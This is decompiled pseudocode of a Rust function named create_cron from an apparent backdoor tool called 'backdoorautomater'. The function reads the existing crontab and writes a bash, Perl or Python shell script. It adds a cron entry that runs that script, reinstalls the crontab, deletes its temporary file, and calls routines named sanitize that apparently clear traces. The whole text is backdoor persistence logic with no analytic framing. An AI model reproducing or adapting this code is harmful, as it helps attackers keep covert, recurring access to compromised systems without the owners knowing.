__int64 __fastcall backdoorautomater::cronshell::create_cron(
        __int128 *a1,
        __int128 *a2,
        __int128 *a3,
        __int64 a4,
        int a5,
        __int64 a6)
{
  __int64 v7; // rax
  __int64 v8; // rcx
  int v9; // eax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rbp
  char v14; // r15
  int v15; // ebx
  char v16; // r12
  int v17; // r14d
  __int64 v18; // rax
  __int128 v19; // xmm0
  __int64 v20; // rbp
  __int64 v21; // r13
  __int64 v22; // rdx
  const char *v23; // rsi
  __int64 v25; // rax
  __int64 v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rax
  char v34; // bl
  unsigned int v35; // [rsp+Ch] [rbp-2ECh] BYREF
  __int128 v36; // [rsp+10h] [rbp-2E8h] BYREF
  __int128 v37; // [rsp+20h] [rbp-2D8h]
  __int128 v38; // [rsp+30h] [rbp-2C8h]
  __int64 v39; // [rsp+40h] [rbp-2B8h]
  __int128 v40; // [rsp+50h] [rbp-2A8h] BYREF
  __int64 v41; // [rsp+60h] [rbp-298h]
  __int128 *v42; // [rsp+70h] [rbp-288h]
  int v43; // [rsp+7Ch] [rbp-27Ch]
  __int128 v44; // [rsp+80h] [rbp-278h] BYREF
  __int64 v45; // [rsp+90h] [rbp-268h]
  __int128 *v46; // [rsp+B8h] [rbp-240h]
  __int128 v47; // [rsp+C0h] [rbp-238h] BYREF
  __int128 v48; // [rsp+D0h] [rbp-228h]
  __int128 v49; // [rsp+E0h] [rbp-218h]
  __int64 v50; // [rsp+F0h] [rbp-208h]
  __int64 v51; // [rsp+F8h] [rbp-200h]
  __int128 v52; // [rsp+100h] [rbp-1F8h] BYREF
  __int64 v53; // [rsp+110h] [rbp-1E8h]
  __int128 *v54; // [rsp+118h] [rbp-1E0h]
  __int128 v55; // [rsp+120h] [rbp-1D8h] BYREF
  __m256i v56; // [rsp+130h] [rbp-1C8h]
  __int64 v57; // [rsp+1F8h] [rbp-100h]
  __int128 v58; // [rsp+200h] [rbp-F8h] BYREF
  __int64 v59; // [rsp+210h] [rbp-E8h]
  _QWORD v60[3]; // [rsp+220h] [rbp-D8h] BYREF
  char v61[8]; // [rsp+238h] [rbp-C0h] BYREF
  __int64 v62; // [rsp+240h] [rbp-B8h]
  __int64 v63; // [rsp+248h] [rbp-B0h]
  __int128 v64; // [rsp+250h] [rbp-A8h] BYREF
  __int64 v65; // [rsp+260h] [rbp-98h]
  _BYTE v66[24]; // [rsp+268h] [rbp-90h] BYREF
  __int128 v67; // [rsp+280h] [rbp-78h] BYREF
  __int64 v68; // [rsp+290h] [rbp-68h]
  __int128 v69; // [rsp+298h] [rbp-60h] BYREF
  __m256i v70; // [rsp+2A8h] [rbp-50h]

  v51 = a6;
  v57 = a4;
  v42 = a2;
  v46 = a1;
  v7 = *((_QWORD *)a3 + 1);
  v54 = a3;
  v8 = v7 + *((_QWORD *)a3 + 2);
  *(_QWORD *)&v55 = v7;
  *((_QWORD *)&v55 + 1) = v8;
  v9 = <core::str::iter::Chars as core::iter::traits::double_ended::DoubleEndedIterator>::next_back(&v55);
  if ( v9 != 47 && v9 != 1114112 )
    alloc::string::String::push(v54);
  v56.m256i_i64[0] = *((_QWORD *)v54 + 2);
  v55 = *v54;
  *(_OWORD *)&v56.m256i_u64[1] = *(_OWORD *)v57;
  v56.m256i_i64[3] = *(_QWORD *)(v57 + 16);
  alloc::str::join_generic_copy(&v44, &v55, 2LL, 1LL, 0LL);
  v53 = v45;
  v52 = v44;
  core::ptr::drop_in_place<[alloc::string::String; 2]>(&v55);
  <alloc::string::String as core::clone::Clone>::clone(v66, v42);
  <alloc::string::String as core::clone::Clone>::clone(v61, &v52);
  std::process::Command::new(&v55, aSh_3, 2LL);
  v10 = std::process::Command::arg(&v55, aC_5, 2LL);
  v11 = std::process::Command::arg(v10, aCrontabLAllCro, 21LL);
  std::process::Command::output(&v44, v11);
  core::result::Result<T,E>::expect(&v47, &v44, &off_22A8D8);
  core::ptr::drop_in_place<std::process::Command>(&v55);
  alloc::string::String::from_utf8_lossy(&v44, v49, *((_QWORD *)&v49 + 1));
  v12 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v44);
  <T as alloc::slice::hack::ConvertVec>::to_vec(&v55, v12);
  v41 = v56.m256i_i64[0];
  v40 = v55;
  core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v44);
  backdoorautomater::sanitizer::sanitize_system_command((__int64)&v40);
  std::fs::File::open(&v55, aAllCron, 8LL);
  if ( (_DWORD)v55 )
  {
    v13 = *((_QWORD *)&v55 + 1);
    v14 = 1;
    goto LABEL_27;
  }
  std::io::buffered::bufreader::BufReader<R>::with_capacity(&v69, 0x2000LL, DWORD1(v55));
  v43 = a5;
  v60[0] = 0LL;
  v60[1] = 8LL;
  v60[2] = 0LL;
  v56 = v70;
  v55 = v69;
  v15 = 1;
  while ( 1 )
  {
    <std::io::Lines<B> as core::iter::traits::iterator::Iterator>::next(&v44, &v55);
    if ( (_QWORD)v44 == 0x8000000000000001LL )
      break;
    v13 = *((_QWORD *)&v44 + 1);
    if ( (_QWORD)v44 == 0x8000000000000000LL )
    {
      core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&v55);
      v14 = 1;
LABEL_26:
      core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(v60);
      goto LABEL_27;
    }
    v67 = v44;
    v68 = v45;
    alloc::vec::Vec<T,A>::push(v60, &v67);
  }
  core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&v55);
  v16 = v43;
  v17 = (unsigned __int8)v43;
  if ( (_BYTE)v43 == 3 )
  {
    *(_QWORD *)&v37 = *((_QWORD *)v42 + 2);
    v36 = *v42;
    v45 = *((_QWORD *)v46 + 2);
    v44 = *v46;
    v56.m256i_i64[0] = v53;
    v55 = v52;
    v18 = backdoorautomater::cronshell::write_shell_bash((__int64)&v36, (__int64)&v44, (__int64)&v55);
    goto LABEL_17;
  }
  if ( (unsigned __int8)v43 == 2 )
  {
    *(_QWORD *)&v37 = *((_QWORD *)v42 + 2);
    v36 = *v42;
    v45 = *((_QWORD *)v46 + 2);
    v44 = *v46;
    v56.m256i_i64[0] = v53;
    v55 = v52;
    v18 = backdoorautomater::cronshell::write_shell_perl((__int64)&v36, (__int64)&v44, (__int64)&v55);
    goto LABEL_17;
  }
  if ( (unsigned __int8)v43 == 1 )
  {
    *(_QWORD *)&v37 = *((_QWORD *)v42 + 2);
    v36 = *v42;
    v45 = *((_QWORD *)v46 + 2);
    v44 = *v46;
    v56.m256i_i64[0] = v53;
    v55 = v52;
    v18 = backdoorautomater::cronshell::write_shell_pyfile((__int64)&v36, (__int64)&v44, (__int64)&v55);
LABEL_17:
    LOBYTE(v15) = 1;
    v14 = 0;
    backdoorautomater::sanitizer::sanitize_return_fn(v18);
    goto LABEL_19;
  }
  v14 = 1;
  v15 = 0;
LABEL_19:
  v19 = *(_OWORD *)(v51 + 8);
  v20 = v62;
  v21 = v63;
  *(_QWORD *)&v55 = asc_1671A0;
  *((_QWORD *)&v55 + 1) = 2LL;
  *(_OWORD *)v56.m256i_i8 = v19;
  alloc::str::join_generic_copy(&v44, &v55, 2LL, 1LL, 0LL);
  v59 = v45;
  v58 = v44;
  alloc::vec::Vec<T,A>::extend_from_slice(&v58, asc_16716D, 9LL);
  if ( v16 == 1 )
  {
    v22 = 7LL;
    v23 = aPython;
    goto LABEL_23;
  }
  if ( v17 == 2 )
  {
    v22 = 5LL;
    v23 = aPerl_0;
LABEL_23:
    alloc::vec::Vec<T,A>::extend_from_slice(&v58, v23, v22);
  }
  alloc::vec::Vec<T,A>::extend_from_slice(&v58, v20, v21);
  v56.m256i_i64[0] = v59;
  v55 = v58;
  alloc::vec::Vec<T,A>::push(v60, &v55);
  std::fs::File::create(&v55, aAllCron, 8LL);
  if ( (_DWORD)v55 )
  {
    v13 = *((_QWORD *)&v55 + 1);
    goto LABEL_26;
  }
  v43 = v15;
  v35 = DWORD1(v55);
  <alloc::vec::Vec<T,A> as core::iter::traits::collect::IntoIterator>::into_iter(&v55, v60);
  <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v64, &v55);
  if ( (_QWORD)v64 == 0x8000000000000000LL )
  {
LABEL_36:
    core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&v55);
    std::process::Command::new(&v55, aSh_3, 2LL);
    v25 = std::process::Command::arg(&v55, aC_5, 2LL);
    v26 = std::process::Command::arg(v25, aCrontabR, 10LL);
    std::process::Command::output(&v44, v26);
    core::result::Result<T,E>::expect(&v36, &v44, &off_22A8F0);
    core::ptr::drop_in_place<std::process::Output>(&v47);
    v50 = v39;
    v49 = v38;
    v48 = v37;
    v47 = v36;
    core::ptr::drop_in_place<std::process::Command>(&v55);
    alloc::string::String::from_utf8_lossy(&v44, v49, *((_QWORD *)&v49 + 1));
    v27 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v44);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v55, v27);
    *(_QWORD *)&v37 = v56.m256i_i64[0];
    v36 = v55;
    core::ptr::drop_in_place<alloc::string::String>(&v40);
    v41 = v37;
    v40 = v36;
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v44);
    backdoorautomater::sanitizer::sanitize_system_command((__int64)&v40);
    std::process::Command::new(&v55, aSh_3, 2LL);
    v28 = std::process::Command::arg(&v55, aC_5, 2LL);
    v29 = std::process::Command::arg(v28, aCrontabAllCron, 16LL);
    std::process::Command::output(&v44, v29);
    core::result::Result<T,E>::expect(&v36, &v44, &off_22A908);
    core::ptr::drop_in_place<std::process::Output>(&v47);
    v50 = v39;
    v49 = v38;
    v48 = v37;
    v47 = v36;
    core::ptr::drop_in_place<std::process::Command>(&v55);
    alloc::string::String::from_utf8_lossy(&v44, v49, *((_QWORD *)&v49 + 1));
    v30 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v44);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v55, v30);
    *(_QWORD *)&v37 = v56.m256i_i64[0];
    v36 = v55;
    core::ptr::drop_in_place<alloc::string::String>(&v40);
    v41 = v37;
    v40 = v36;
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v44);
    backdoorautomater::sanitizer::sanitize_system_command((__int64)&v40);
    std::process::Command::new(&v55, aSh_3, 2LL);
    v31 = std::process::Command::arg(&v55, aC_5, 2LL);
    v32 = std::process::Command::arg(v31, aRmAllCron, 11LL);
    std::process::Command::output(&v44, v32);
    core::result::Result<T,E>::expect(&v36, &v44, &off_22A920);
    core::ptr::drop_in_place<std::process::Output>(&v47);
    v50 = v39;
    v49 = v38;
    v48 = v37;
    v47 = v36;
    core::ptr::drop_in_place<std::process::Command>(&v55);
    alloc::string::String::from_utf8_lossy(&v44, v49, *((_QWORD *)&v49 + 1));
    v33 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v44);
    <T as alloc::slice::hack::ConvertVec>::to_vec(&v55, v33);
    *(_QWORD *)&v37 = v56.m256i_i64[0];
    v36 = v55;
    core::ptr::drop_in_place<alloc::string::String>(&v40);
    v41 = v37;
    v40 = v36;
    core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v44);
    backdoorautomater::sanitizer::sanitize_system_command((__int64)&v40);
    *(_QWORD *)&v55 = &off_22A938;
    *((_QWORD *)&v55 + 1) = 1LL;
    v56.m256i_i64[0] = 8LL;
    *(_OWORD *)&v56.m256i_u64[1] = 0LL;
    std::io::stdio::_print(&v55);
    *(_QWORD *)&v36 = v66;
    *(_QWORD *)&v44 = &v36;
    *((_QWORD *)&v44 + 1) = <&T as core::fmt::Display>::fmt;
    *(_QWORD *)&v55 = &off_22A948;
    *((_QWORD *)&v55 + 1) = 2LL;
    v56.m256i_i64[0] = (__int64)&v44;
    *(_OWORD *)&v56.m256i_u64[1] = 1uLL;
    std::io::stdio::_print(&v55);
    core::ptr::drop_in_place<std::fs::File>(v35);
    v34 = v43;
    core::ptr::drop_in_place<alloc::string::String>(&v40);
    core::ptr::drop_in_place<std::process::Output>(&v47);
    core::ptr::drop_in_place<alloc::string::String>(v61);
    core::ptr::drop_in_place<alloc::string::String>(v66);
    if ( !v34 )
      core::ptr::drop_in_place<alloc::string::String>(&v52);
    core::ptr::drop_in_place<alloc::string::String>(v51);
    if ( v34 )
      return 0LL;
    core::ptr::drop_in_place<alloc::string::String>(v42);
    v13 = 0LL;
    goto LABEL_31;
  }
  while ( 1 )
  {
    *(_QWORD *)&v37 = v65;
    v36 = v64;
    <alloc::string::String as core::clone::Clone>::clone(&v44, &v36);
    alloc::vec::Vec<T,A>::extend_from_slice(&v44, asc_167182, 1LL);
    v13 = std::io::Write::write_all(&v35, *((_QWORD *)&v44 + 1), v45);
    if ( v13 )
      break;
    core::ptr::drop_in_place<alloc::string::String>(&v44);
    core::ptr::drop_in_place<alloc::string::String>(&v36);
    <alloc::vec::into_iter::IntoIter<T,A> as core::iter::traits::iterator::Iterator>::next(&v64, &v55);
    if ( (_QWORD)v64 == 0x8000000000000000LL )
      goto LABEL_36;
  }
  core::ptr::drop_in_place<alloc::string::String>(&v44);
  core::ptr::drop_in_place<alloc::string::String>(&v36);
  core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&v55);
  core::ptr::drop_in_place<std::fs::File>(v35);
LABEL_27:
  core::ptr::drop_in_place<alloc::string::String>(&v40);
  core::ptr::drop_in_place<std::process::Output>(&v47);
  core::ptr::drop_in_place<alloc::string::String>(v61);
  core::ptr::drop_in_place<alloc::string::String>(v66);
  if ( v14 )
    core::ptr::drop_in_place<alloc::string::String>(&v52);
  core::ptr::drop_in_place<alloc::string::String>(v51);
  if ( v14 )
  {
    core::ptr::drop_in_place<alloc::string::String>(v42);
LABEL_31:
    core::ptr::drop_in_place<alloc::string::String>(v46);
  }
  return v13;
}